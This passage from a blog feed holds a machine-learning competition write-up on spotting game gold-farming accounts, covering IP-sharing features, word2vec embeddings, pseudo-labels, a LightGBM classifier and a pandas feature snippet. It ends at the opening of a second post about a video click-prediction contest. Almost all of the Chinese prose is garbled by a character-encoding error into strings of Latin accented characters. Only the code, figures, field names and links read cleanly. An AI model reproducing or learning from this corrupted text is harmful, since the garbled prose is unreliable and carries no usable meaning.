ç™»å…¥æ•°æ®çš„ç¦»æ•£æ•°æ®ç»Ÿè®¡</div>            </figure></div><p>ç™»å‡ºæ•°æ®å­—æ®µå’Œç™»å…¥æ•°æ®å·®ä¸å¤šï¼Œä»…å¤šäº†åœ¨çº¿æ—¶é•¿ï¼ˆonlinetimeï¼‰ç‰¹å¾ï¼Œæ‰€ä»¥åœ¨åç»­çš„å¤„ç†ä¸­ï¼Œå°†äºŒè€…åˆå¹¶æˆ operation è¡¨æ”¾åœ¨ä¸€èµ·ä½¿ç”¨ï¼Œä½¿å¾—ä»£ç æ›´ç®€æ´ã€‚rolename å…¨ä¸ºç©ºæ²¡æœ‰ä½¿ç”¨ä»·å€¼ã€‚ä»ä¸šåŠ¡ä¸Šè®²ï¼Œdeviceid æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ç‰¹å¾ï¼Œæ ¹æ®è®¾å¤‡idæˆ‘ä»¬å¯ä»¥åˆ¤æ–­å¤šè´¦å·å…±äº«è®¾å¤‡çš„æƒ…å†µã€‚ä½†åœ¨æ•°æ®é›†ä¸­ï¼Œæ¯å¤©ä»…æœ‰ä¸€ä¸ªdeviceidï¼Œ3.1å·çš„ deviceid å…¨ä¸º6259A4950D8B0CA5ï¼Œ3.5å·çš„ deviceid å…¨ä¸º71A1315F1949F262ï¼Œå¤±å»äº†ä½¿ç”¨ä»·å€¼ã€‚</p><p>æ•°æ®é›†ç»™å‡ºäº†æŒ‰å¤©ç»Ÿè®¡çš„å¸å·å‘è¨€æ¬¡æ•°ï¼Œæ•´ä½“åˆ†å¸ƒå¦‚å›¾2æ‰€ç¤ºï¼Œå…·æœ‰å¾ˆæ˜æ˜¾çš„é•¿å°¾åˆ†å¸ƒã€‚åˆ†æ˜¯å¦æ˜¯å·¥ä½œå®¤è§‚å¯Ÿå‘è¨€æ¬¡æ•°åˆ†å¸ƒï¼Œå¦‚å›¾3å’Œå›¾4æ‰€ç¤ºï¼Œå¯ä»¥æ˜æ˜¾çœ‹å‡ºå·¥ä½œå®¤çš„å‘è¨€æ¬¡æ•°ç›¸è¾ƒäºæ­£å¸¸ç”¨æˆ·è¾ƒå¤šï¼Œæ¨æµ‹æ˜¯åœ¨æ¸¸æˆä¸­è¿›è¡Œå«å–æˆ–è€…äº¤æ˜“èŠå¤©ã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_2.png" alt="å›¾2 æ•´ä½“å¸å·å‘è¨€æ¬¡æ•°" title="">                </div>                <div class="image-caption">å›¾2 æ•´ä½“å¸å·å‘è¨€æ¬¡æ•°</div>            </figure></div><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_3.png" alt="å›¾3 å·¥ä½œå®¤å¸å·å‘è¨€æ¬¡æ•°" title="">                </div>                <div class="image-caption">å›¾3 å·¥ä½œå®¤å¸å·å‘è¨€æ¬¡æ•°</div>            </figure></div><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_4.png" alt="å›¾4 æ­£å¸¸ç”¨æˆ·å¸å·å‘è¨€æ¬¡æ•°" title="">                </div>                <div class="image-caption">å›¾4 æ­£å¸¸ç”¨æˆ·å¸å·å‘è¨€æ¬¡æ•°</div>            </figure></div><p>ç”¨æˆ·åˆ›å»ºè§’è‰²æ•°æ®ï¼Œä¸»è¦éœ€è¦å…³æ³¨regchannelï¼ˆæ³¨å†Œæ¸ é“ï¼‰ï¼Œæ€»å…±æœ‰76ç§ä¸åŒçš„æ³¨å†Œæ¸ é“ï¼Œä¸»è¦æ¸ é“æ•°é‡åˆ†å¸ƒå¦‚å›¾5æ‰€ç¤ºã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_5.png" alt="å›¾5 ä¸»è¦æ³¨å†Œæ¸ é“æ•°é‡åˆ†å¸ƒ" title="">                </div>                <div class="image-caption">å›¾5 ä¸»è¦æ³¨å†Œæ¸ é“æ•°é‡åˆ†å¸ƒ</div>            </figure></div><h1 id="ç‰¹å¾å·¥ç¨‹"><a href="#ç‰¹å¾å·¥ç¨‹" class="headerlink" title="ç‰¹å¾å·¥ç¨‹"></a>ç‰¹å¾å·¥ç¨‹</h1><p>æ•°æ®é›†ç»™å‡ºäº†æ“ä½œæ—¶é—´ï¼Œå¯ä»¥æå–å‡ºå°æ—¶ä¿¡æ¯è¿›è¡Œè¿›ä¸€æ­¥ç»Ÿè®¡ã€‚ip ç‰¹å¾èƒ½å¤Ÿå¾ˆå¥½çš„åæ˜ æ˜¯å¦å­˜åœ¨åŒä¸€ ip ä¸‹çš„å¤šè´¦æˆ·è¡Œä¸ºã€‚ip ç‰¹å¾æ¯”è¾ƒç»†åŒ–ï¼Œæ ¹æ®åŸºæœ¬çš„ç½‘ç»œçŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶åˆ†æ®µï¼Œå¾—åˆ°éšè—çš„åœ°åŸŸä¿¡æ¯ã€‚æ‰€ä»¥åœ¨æœ¬æ–¹æ¡ˆä¸­ï¼Œæ„é€ äº†clientip_3 å’Œ clientip_2ï¼Œåˆ†åˆ«å– clientip çš„å‰ä¸‰æ®µå’Œå‰ä¸¤æ®µã€‚logout è¡¨ç»™å‡ºäº†åœ¨çº¿æ—¶é•¿ç‰¹å¾ï¼Œç±»ä¼¼çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°† login è¡¨æŒ‰æ—¶é—´æ’åºï¼Œç™»å…¥æ—¶é—´å‡å»ä¸Šä¸€æ¬¡çš„ç™»å‡ºæ—¶é—´å¯ä»¥å¾—åˆ°ç¦»çº¿æ—¶é•¿ç‰¹å¾ã€‚</p><h2 id="ç»Ÿè®¡ç‰¹å¾"><a href="#ç»Ÿè®¡ç‰¹å¾" class="headerlink" title="ç»Ÿè®¡ç‰¹å¾"></a>ç»Ÿè®¡ç‰¹å¾</h2><p>ç»Ÿè®¡ç‰¹å¾åŒ…æ‹¬ä¸¤æ–¹é¢ï¼Œä»¥uinä¸ºå•ä½ï¼Œåˆ†åˆ«é‡‡ç”¨ä¸åŒçš„æ–¹æ³•å¯¹æ•°å€¼ç‰¹å¾å’Œç±»åˆ«ç‰¹å¾è¿›è¡Œç»Ÿè®¡ã€‚å¯¹æ•°å€¼ç‰¹å¾é‡‡å–ä¸‹åˆ—ç»Ÿè®¡æ–¹æ³•ï¼š</p><ul><li>åœ¨çº¿æ—¶é•¿ï¼šsumï¼Œmedianï¼Œmean;</li><li>ç¦»çº¿æ—¶é•¿ï¼šmeanï¼Œmax</li><li>è§’è‰²ç­‰çº§ï¼šmeanï¼Œmax;</li><li>æˆ˜åŠ›ï¼šmeanï¼Œmaxï¼›</li><li>å¥½å‹æ•°é‡ï¼šmeanï¼Œmaxï¼›</li><li>ç”¨æˆ·æ“ä½œæ—¶é—´ï¼ˆå°æ—¶ï¼‰ï¼šmeanï¼Œminï¼Œmaxã€‚</li></ul><p>å¯¹ä¸‹åˆ—ç±»åˆ«ç‰¹å¾è¿›è¡Œcountç»Ÿè®¡ï¼šplatid, worldid, roleid, job, network, clientip, clientip_3, hour, regchannelã€‚</p><h2 id="ip-ç‰¹å¾"><a href="#ip-ç‰¹å¾" class="headerlink" title="ip ç‰¹å¾"></a>ip ç‰¹å¾</h2><p>æŸ¥èµ„æ–™å¯çŸ¥ï¼Œå·¥ä½œå®¤å¾€å¾€ä¼šè´­ä¹°å¤§é‡æœºå™¨ï¼Œåˆ©ç”¨è‡ªåŠ¨åŒ–è„šæœ¬è¿›è¡Œæ‰“é‡‘ï¼Œæ‰€ä»¥ä¼šå‡ºç°å¤šä¸ªè´¦å·å…±äº« ip çš„æƒ…å†µã€‚æˆ‘ä»¬è®¡ç®—æ¯ä¸ª ip ä¸‹ç™»å½•è¿‡å¤šå°‘ä¸ªè´¦æˆ·ï¼Œå†å¯¹æŸè´¦æˆ·ä½¿ç”¨è¿‡çš„æ‰€æœ‰ ip è®¡ç®—å…¶ç™»å½•è¿‡è´¦æˆ·æ•°çš„å¹³å‡å€¼ï¼Œè¯¥å€¼è¶Šå¤§ï¼Œè¯´æ˜è¯¥è´¦æˆ·æ‰€å¤„ç½‘æ®µæœ‰å¤§é‡è´¦æˆ·ç™»å½•ï¼Œè¶Šæœ‰å¯èƒ½æ˜¯å·¥ä½œå®¤ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">for f in [&#39;clientip&#39;, &#39;clientip_3&#39;]:</span><br><span class="line">    df_temp &#x3D; operation[[&#39;uin&#39;, f]]</span><br><span class="line">    df_temp.drop_duplicates(inplace&#x3D;True)</span><br><span class="line">    df_temp &#x3D; df_temp.groupby([f])[&#39;uin&#39;].nunique().reset_index()</span><br><span class="line">    df_temp.columns &#x3D; [f, &#39;uin_count&#39;]</span><br><span class="line"></span><br><span class="line">    df_temp2 &#x3D; operation[[&#39;uin&#39;, f]]</span><br><span class="line">    df_temp2.drop_duplicates(inplace&#x3D;True)</span><br><span class="line">    df_temp &#x3D; df_temp2.merge(df_temp, how&#x3D;&#39;left&#39;)</span><br><span class="line"></span><br><span class="line">    df_temp &#x3D; df_temp.groupby([&#39;uin&#39;])[&#39;uin_count&#39;].agg(&#123;</span><br><span class="line">        &#39;&#123;&#125;_uin_count_mean&#39;.format(f):</span><br><span class="line">        &#39;mean&#39;</span><br><span class="line">    &#125;).reset_index()</span><br><span class="line">    df_feature &#x3D; df_feature.merge(df_temp, how&#x3D;&#39;left&#39;)</span><br><span class="line">    del df_temp, df_temp2</span><br><span class="line">    gc.collect()</span><br></pre></td></tr></table></figure><h2 id="æ ‡ç­¾äº”æŠ˜äº¤å‰ç»Ÿè®¡ç‰¹å¾"><a href="#æ ‡ç­¾äº”æŠ˜äº¤å‰ç»Ÿè®¡ç‰¹å¾" class="headerlink" title="æ ‡ç­¾äº”æŠ˜äº¤å‰ç»Ÿè®¡ç‰¹å¾"></a>æ ‡ç­¾äº”æŠ˜äº¤å‰ç»Ÿè®¡ç‰¹å¾</h2><p>åœ¨æ¨èä»»åŠ¡ä¸­ï¼Œç»å¸¸ä½¿ç”¨ç‚¹å‡»ç‡ç‰¹å¾ï¼Œå³ç»Ÿè®¡æŸä¸ªç±»åˆ«ç‰¹å¾ä¸‹ç‚¹å‡»å•†å“çš„æ¦‚ç‡ã€‚åŒæ ·ä½œä¸ºäºŒåˆ†ç±»ä»»åŠ¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ„é€ æŸä¸ªç±»åˆ«ç‰¹å¾ä¸‹æ˜¯å·¥ä½œå®¤çš„æ¦‚ç‡ã€‚è¯¥ç±»ç‰¹å¾åˆ©ç”¨äº†æ ‡ç­¾ä¿¡æ¯ï¼Œå®¹æ˜“å‡ºç°æ ‡ç­¾æ³„éœ²é—®é¢˜ï¼Œæ‰€ä»¥åœ¨å®é™…æ“ä½œä¸­ï¼Œå°†è®­ç»ƒé›†åˆ†ä¸º5ä»½ï¼Œæ¯æ¬¡ä½¿ç”¨4ä»½åšæ ‡ç­¾ç»Ÿè®¡ï¼Œå¾—åˆ°çš„æ¦‚ç‡å€¼ç»™å¦å¤–1ä»½åšç‰¹å¾ã€‚æœ¬æ–¹æ¡ˆæ„é€ äº† chat_cnt å’Œ clientip_3 ç±»åˆ«ä¸‹çš„å·¥ä½œå®¤æ¦‚ç‡ã€‚</p><h2 id="embedding-ç‰¹å¾"><a href="#embedding-ç‰¹å¾" class="headerlink" title="embedding ç‰¹å¾"></a>embedding ç‰¹å¾</h2><p>ip å­—æ®µèƒ½å¸®åŠ©æˆ‘ä»¬å¾ˆå¥½çš„åˆ¤æ–­æ˜¯å¦å­˜åœ¨è´¦æˆ·èšé›†è¡Œä¸ºï¼Œå‡å¦‚æˆ‘ä»¬èƒ½å¤Ÿå°†æ— æ³•å®šé‡è®¡ç®—çš„ ip åœ°å€è½¬æˆæ¨¡å‹èƒ½å¤Ÿè¯†åˆ«çš„æ•°å­—ç‰¹å¾ï¼Œå°†ä¼šå¸®åŠ©æ¨¡å‹æ›´å¥½åœ°åˆ©ç”¨ ip ä¿¡æ¯ã€‚æˆ‘ä»¬æ•´ç†å‡ºæ¯ä¸ªè´¦æˆ·åœ¨å“ªäº› ip æ“ä½œè¿‡ï¼Œå°†è¿™äº› ip åˆ—è¡¨ä½œä¸º sentence è¾“å…¥åˆ° word2vec æ¨¡å‹ï¼Œå°† ip æ˜ å°„ä¸ºå‘é‡ï¼Œç»å¸¸å‡ºç°åœ¨ä¸Šä¸‹æ–‡ä¸­çš„ ip åœ¨ embedding ç©ºé—´ä¸­ä¹Ÿç›¸è¿‘ã€‚æœ€åå°†è´¦æˆ·ä¸‹æ‰€æœ‰ ip çš„å‘é‡å–å¹³å‡ä½œä¸ºæ–°ç‰¹å¾ã€‚æ•ˆä»¿å¯¹ ip ç‰¹å¾çš„å¤„ç†ï¼Œæˆ‘ä»¬è¿˜å¯¹ worldid å’Œ job åšäº†ç±»ä¼¼çš„æ“ä½œã€‚</p><h2 id="æµæ°´ç‰¹å¾"><a href="#æµæ°´ç‰¹å¾" class="headerlink" title="æµæ°´ç‰¹å¾"></a>æµæ°´ç‰¹å¾</h2><p>å†³èµ›ç»™å‡ºäº†è§’è‰²çš„è¯¦ç»†è´§å¸å’Œç‰©å“æµæ°´ä¿¡æ¯(å½“å¤©æŒ‰æ—¶é—´é¡ºåºå‰300æ¡è®°å½•)ã€‚ç»“åˆä¸šåŠ¡è€ƒè™‘ï¼Œå·¥ä½œå®¤å¾€å¾€ä¼šè¿›è¡Œå¤§é‡çš„äº¤æ˜“è¡Œä¸ºï¼Œå®ç°ç‰©å“æˆ–è´§å¸å¥—åˆ©ã€‚æ‰€ä»¥å¯¹è´§å¸å˜åŒ–æ•°ï¼Œé“å…·å˜åŠ¨æ•°é‡è¿›è¡Œç»Ÿè®¡ï¼ŒåŒ…æ‹¬æ±‚å’Œï¼Œæ±‚å¹³å‡å€¼ï¼Œæ±‚æœ€å¤§å€¼å’Œè®¡æ•°ã€‚è´§å¸å˜åŒ–å¯ä»¥è¯¦ç»†åˆ°å¢åŠ æˆ–å‡å°‘ï¼Œå¯ä»¥è¿›ä¸€æ­¥åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹è¿›è¡Œç»Ÿè®¡ã€‚æ­¤å¤–æ•°æ®é›†è¿˜ç»™å‡ºäº†äº¤æ˜“çš„ç†ç”±ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç»Ÿè®¡æ¯ä¸ªç†ç”±ä¸‹è¿›è¡Œäº¤æ˜“çš„è´§å¸æ•°å’Œç‰©å“æ•°ã€‚è´§å¸ç±»å‹ï¼Œè´§å¸æµåŠ¨ä¸€çº§åŸå› ï¼Œé“å…·æµåŠ¨ä¸€çº§åŸå› ï¼Œå°¤å…¶æ˜¯é“å…·IDï¼Œè¿™å‡ ä¸ªç±»åˆ«ç‰¹å¾ç»´åº¦è¾ƒå¤§ï¼Œåˆ†åˆ«è¿›è¡Œç»Ÿè®¡ä¼šå¼•å…¥å¤§é‡ç‰¹å¾ï¼Œè€Œä¸”æ•°æ®æ™®éå­˜åœ¨ç¨€ç–é—®é¢˜ã€‚ä»¥é“å…·IDä¸ºä¾‹ï¼ŒID ä¸º342çš„ç‰©å“åªäº¤æ˜“è¿‡ä¸€æ¬¡ï¼Œæ‰€ä»¥â€œç‰©å“342çš„äº¤æ˜“æ•°é‡â€ç‰¹å¾å°±ä¼šååˆ†ç¨€ç–ï¼Œåªæœ‰ä¸€ä¸ªè´¦æˆ·ä¸‹è¯¥ç‰¹å¾æœ‰ç»Ÿè®¡å€¼ã€‚</p><p>æœ€ç»ˆï¼Œæœ¬æ–¹æ¡ˆæ€»å…±ä½¿ç”¨704ä¸ªç‰¹å¾ï¼Œé‡è¦æ€§æ¯”è¾ƒé«˜çš„ç‰¹å¾å¦‚å›¾6æ‰€ç¤ºï¼Œå¯ä»¥çœ‹å‡ºè´¦æˆ·çš„åœ¨çº¿æ—¶é•¿ï¼Œç¦»çº¿æ—¶é•¿ç‰¹å¾å¾ˆé‡è¦ï¼Œå› ä¸ºå·¥ä½œå®¤ç›¸è¾ƒäºæ­£å¸¸ç”¨æˆ·ä¼šèŠ±è´¹æ›´å¤šçš„æ—¶é—´è¿›è¡Œæ¸¸æˆï¼Œè¿½æ±‚åˆ©ç›Šçš„æœ€å¤§åŒ–ã€‚æ—¶æ®µï¼ˆhourï¼‰ç‰¹å¾ä¹Ÿæ¯”è¾ƒé‡è¦ï¼Œå·¥ä½œå®¤ä¸åˆ†ç™½å¤©é»‘å¤œè¿›è¡Œæ¸¸æˆï¼Œè€Œæ­£å¸¸çš„ç”¨æˆ·ä¸ä¼šåœ¨ç™½å¤©èŠ±è´¹å¤§é‡çš„æ—¶é—´è¿›è¡Œæ¸¸æˆã€‚åŠ å…¥æµæ°´ç‰¹å¾åï¼ŒReason12ä¸‹çš„è´§å¸äº¤æ˜“å°¤ä¸ºé‡è¦ã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_6.png" alt="å›¾6 ç‰¹å¾é‡è¦æ€§" title="">                </div>                <div class="image-caption">å›¾6 ç‰¹å¾é‡è¦æ€§</div>            </figure></div><h1 id="ä¼ªæ ‡ç­¾"><a href="#ä¼ªæ ‡ç­¾" class="headerlink" title="ä¼ªæ ‡ç­¾"></a>ä¼ªæ ‡ç­¾</h1><p>åœ¨è®­ç»ƒæ¨¡å‹æ—¶ï¼Œæˆ‘ä»¬æ€»å¸Œæœ›è¾“å…¥çš„æ•°æ®æ•°æ®é‡å°½å¯èƒ½å¤§ï¼Œæ•°æ®æ ‡ç­¾å°½å¯èƒ½åˆ†å¸ƒå‡åŒ€ã€‚åœ¨å¯¹æµ‹è¯•é›†è¿›è¡Œé¢„æµ‹æ—¶ï¼ŒLightGBM æ¨¡å‹è¾“å‡ºçš„æ˜¯è´¦æˆ·æ˜¯æ‰“é‡‘å·¥ä½œå®¤çš„æ¦‚ç‡ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºç½®ä¿¡åº¦ï¼Œä»å›¾7å¯ä»¥çœ‹å‡ºï¼Œæ¦‚ç‡åˆ†å¸ƒå¤§å¤šåˆ†å¸ƒåœ¨ä¸¤å¤´ï¼Œææœ‰å¯èƒ½æ˜¯å’Œææœ‰å¯èƒ½ä¸æ˜¯ã€‚æˆ‘ä»¬å®Œå…¨å¯ä»¥å°†ç½®ä¿¡åº¦è¾ƒé«˜çš„æµ‹è¯•é›†æ•°æ®ä½œä¸ºæ ‡ç­¾ä¸º1çš„æ–°è®­ç»ƒé›†ï¼Œä»è€Œè¾¾åˆ°æ‰©å¢è®­ç»ƒé›†ä¸”ç¨å¾®å¹³è¡¡æ ·æœ¬æ ‡ç­¾çš„ç›®çš„ã€‚ç”±äºæœ¬æ¬¡æ¯”èµ›æ²¡æœ‰æ¦œå•ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†é€‰æ‹©æ¯”è¾ƒè°¨æ…ï¼ŒåªæŒ‘å‡ºæ¦‚ç‡å€¼å¤§äº0.99çš„æµ‹è¯•é›†æ•°æ®æ·»åŠ åˆ°è®­ç»ƒé›†ï¼Œçº¿ä¸‹å¤§æ¦‚èƒ½æå‡0.006ã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_7.png" alt="å›¾7 æ¦‚ç‡å€¼åˆ†å¸ƒ" title="">                </div>                <div class="image-caption">å›¾7 æ¦‚ç‡å€¼åˆ†å¸ƒ</div>            </figure></div><h1 id="æ¨¡å‹"><a href="#æ¨¡å‹" class="headerlink" title="æ¨¡å‹"></a>æ¨¡å‹</h1><p>åˆ©ç”¨ LightGBM æ¨¡å‹è¿›è¡ŒäºŒåˆ†ç±»ä»»åŠ¡ï¼Œå·¥ä½œå®¤è´¦å·æ ‡ç­¾è®¾ç½®ä¸º1ï¼Œæ­£å¸¸è´¦å·è®¾ç½®ä¸º0ã€‚é‡‡ç”¨äº”æŠ˜äº¤å‰æ³•ï¼Œå°†3.1å·çš„æ•°æ®åˆ†ä¸ºäº”ä»½ï¼Œæ¯æ¬¡ä½¿ç”¨4ä»½è®­ç»ƒï¼Œå¦å¤–ä¸€ä»½ç”¨æ¥éªŒè¯ã€‚ç”±äºæ ·æœ¬æ ‡ç­¾åˆ†å¸ƒä¸å‡è¡¡ï¼Œæˆ‘ä»¬ä¸èƒ½ç”¨0.5ä½œä¸ºæ­£è´Ÿæ ·æœ¬çš„åˆ†å‰²ç‚¹ï¼Œè€Œåº”è¯¥é‡‡ç”¨æ¯”ä¾‹æ³•ã€‚æ­£æ ·æœ¬å¤§æ¦‚å æ€»æ ·æœ¬çš„13.66%ï¼Œæ‰€ä»¥å°†æµ‹è¯•é›†çš„é¢„æµ‹æ¦‚ç‡æŒ‰ä»å¤§åˆ°å°æ’åºï¼Œå‰13.66%æŒ‘é€‰ä¸ºå·¥ä½œå®¤è´¦å·ã€‚åœ¨æœ¬åœ°éªŒè¯é›†ä¸Šï¼Œç²¾ç¡®ç‡è¾¾åˆ°0.9700214132762313ï¼Œå¬å›ç‡è¾¾åˆ°0.9324642227014311ï¼Œæ¯”èµ›æŒ‡æ ‡è¾¾åˆ°0.9603513111071851ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç”±äºæ˜¯é«˜æ ¡èµ›ï¼Œä¸»åŠæ–¹å¤§æ¦‚è€ƒè™‘åˆ°å­¦ç”Ÿå…šçš„æœºå™¨æ€§èƒ½é™åˆ¶ï¼Œæ‰€ä»¥æ•°æ®é›†å¹¶ä¸æ˜¯å¾ˆå¤§ï¼Œæ¯”èµ›æ—¶é—´ä¹Ÿæ¯”è¾ƒç´§å‡‘ï¼Œåˆèµ›12ä¸ªå°æ—¶ï¼Œå†³èµ›ä¸‰å¤©ï¼Œæ•´ä½“ä½“éªŒæ¯”è¾ƒå¥½ã€‚èµ›åé˜…è¯»ç¬¬ä¸€å¤§ä½¬çš„æ–¹æ¡ˆï¼Œç‰¹å¾å·¥ç¨‹æ€è·¯åŸºæœ¬ç›¸åŒï¼Œä½†å¤§ä½¬åœ¨æµæ°´ç»Ÿè®¡æ–¹é¢åšçš„æ›´ç»†è‡´ï¼Œå¹¶æ²¡æœ‰åƒæˆ‘ç›´æ¥ä¸€è‚¡è„‘çš„å¯¹æ‰€æœ‰åˆ†ç±»è¿›è¡Œç»Ÿè®¡ã€‚æ­¤å¤–è¿˜åˆ©ç”¨å¯¹æŠ—è®­ç»ƒè¿›è¡Œç‰¹å¾ç­›é€‰ï¼Œåˆ å»åœ¨è®­ç»ƒé›†å’Œæµ‹è¯•é›†ä¸Šåˆ†å¸ƒå·®å¼‚è¾ƒå¤§çš„ç‰¹å¾ã€‚</p><blockquote><p>é€šè¿‡role_itemflowï¼Œæ„é€ äº†ä¸»è¦ç‰©å“ç±»å‹ï¼ˆç±»å‹20025, 20035, 20036, 20028ï¼‰çš„æµæ°´æ¬¡æ•°å’Œç‰©å“å˜åŠ¨æ•°é‡ï¼Œä¸»è¦æµæ°´åŸå› ï¼ˆåŸå› 84, 12, 85, 5ï¼‰çš„æµæ°´æ¬¡æ•°ã€‚</p></blockquote><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ul><li><a href="https://gslab.qq.com/article-699-1.html" target="_blank" rel="noopener">èµ›é“ç¬¬ä¸€åæ–¹æ¡ˆåˆ†äº«</a></li></ul>]]></content>
        <author>
            <name><![CDATA[LogicJakeâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/02/10/%E5%9B%BE%E7%81%B5%E8%81%94%E9%82%A6%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E9%A2%84%E6%B5%8B%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[å›¾çµè”é‚¦è§†é¢‘ç‚¹å‡»é¢„æµ‹å¤§èµ›-èµ›åæ€»ç»“]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/02/10/%E5%9B%BE%E7%81%B5%E8%81%94%E9%82%A6%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E9%A2%84%E6%B5%8B%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/02/10/%E5%9B%BE%E7%81%B5%E8%81%94%E9%82%A6%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E9%A2%84%E6%B5%8B%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>æœ€ç»ˆæˆç»©ï¼šA, Bæ¦œç¬¬ä¸‰ã€‚<br>æ¯”èµ›åœ°å€ï¼š<a href="https://www.turingtopia.com/competitionnew/detail/e4880352b6ef4f9f8f28e8f98498dbc4/sketch" target="_blank" rel="noopener">https://www.turingtopia.com/competitionnew/detail/e4880352b6ef4f9f8f28e8f98498dbc4/sketch</a><br>ä»£ç åœ°å€ï¼š<a href="https://github.com/LogicJake/tuling-video-click-top3" target="_blank" rel="noopener">https://github.com/LogicJake/tuling-video-click-top3</a></p><h1 id="èµ›é¢˜èƒŒæ™¯"><a href="#èµ›é¢˜èƒŒæ™¯" class="headerlink" title="èµ›é¢˜èƒŒæ™¯"></a>èµ›é¢˜èƒŒæ™¯</h1><p>ç§»åŠ¨äº’è”ç½‘çš„å¿«é€Ÿå‘å±•ï¼Œå‚¬ç”Ÿäº†æµ·é‡è§†é¢‘æ•°æ®çš„äº§ç”Ÿï¼Œä¹Ÿä¸ºç”¨æˆ·æä¾›äº†ç±»å‹ä¸°å¯Œçš„è§†é¢‘æ•°æ®ç±»å‹ã€‚é¢å¯¹å¦‚ä½•ä»æµ·é‡è§†é¢‘æ•°æ®ç±»å‹ä¸­é€‰æ‹©ç”¨æˆ·å–œæ¬¢çš„ç±»å‹çš„è¿™ä¸€éš¾é¢˜ï¼Œä½œä¸ºä¸€å®¶æ‹¥æœ‰æµ·é‡è§†é¢‘ç´ æå’Œç”¨æˆ·è¡Œä¸ºçš„æ•°æ®å…¬å¸ï¼Œå¸Œæœ›é€šè¿‡ç”¨æˆ·è¡Œä¸ºæ•°æ®ï¼Œç”¨æˆ·ç‰¹å¾ï¼Œä»¥åŠè§†é¢‘ç‰¹å¾ï¼Œå¯ä»¥åœ¨å……è¶³æ•°æ®åŸºç¡€ä¸Šç²¾å‡†çš„æ¨èç»™ç”¨æˆ·å–œæ¬¢çš„è§†é¢‘ç±»å‹ã€‚</p><p>æœ¬æ¬¡ç«èµ›çš„ç›®çš„æ˜¯ä»¥ç”¨æˆ·çš„è§†é¢‘è¡Œä¸ºæ•°æ®ä¸ºåŸºç¡€ï¼Œæ„å»ºæ¨èæ¨¡å‹ï¼Œå‚èµ›é˜Ÿä¼åˆ™éœ€è¦æ­å»ºä¸ªæ€§åŒ–æ¨èæ¨¡å‹ã€‚å¸Œæœ›å‚èµ›é˜Ÿä¼èƒ½å¤ŸæŒ–æ˜æ•°æ®èƒŒåä¸°å¯Œçš„å†…æ¶µï¼Œä¸ºç§»åŠ¨ç”¨æˆ·åœ¨åˆé€‚çš„æ—¶é—´ã€åˆé€‚çš„åœ°ç‚¹ç²¾å‡†æ¨èç”¨æˆ·æ„Ÿå…´è¶£çš„å†…å®¹ï¼Œæé«˜ç”¨æˆ·åœ¨æ•°æ®é›†ä¸Šçš„ç‚¹å‡»è¡Œä¸ºã€‚</p><p>å‚èµ›è€…é€šè¿‡æ„å»ºæ¨èæ¨¡å‹ï¼Œé¢„æµ‹å¾…æµ‹è¯•æ•°æ®ä¸­ç”¨æˆ·åœ¨å¯¹åº”çš„è§†é¢‘ä¸Šæ˜¯å¦ä¼šäº§ç”Ÿç‚¹å‡»è¡Œä¸ºã€‚</p><h1 id="æ•°æ®è¯´æ˜"><a href="#æ•°æ®è¯´æ˜" class="headerlink" title="æ•°æ®è¯´æ˜"></a>æ•°æ®è¯´æ˜</h1><p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯ç”¨æˆ·åœ¨èµ„è®¯å…¨é›†ä¸Šçš„ç§»åŠ¨ç«¯è¡Œä¸ºæ•°æ®ï¼ˆDï¼‰ã€‚</p><p>è®­ç»ƒæ•°æ®åŒ…å«äº†æŠ½æ 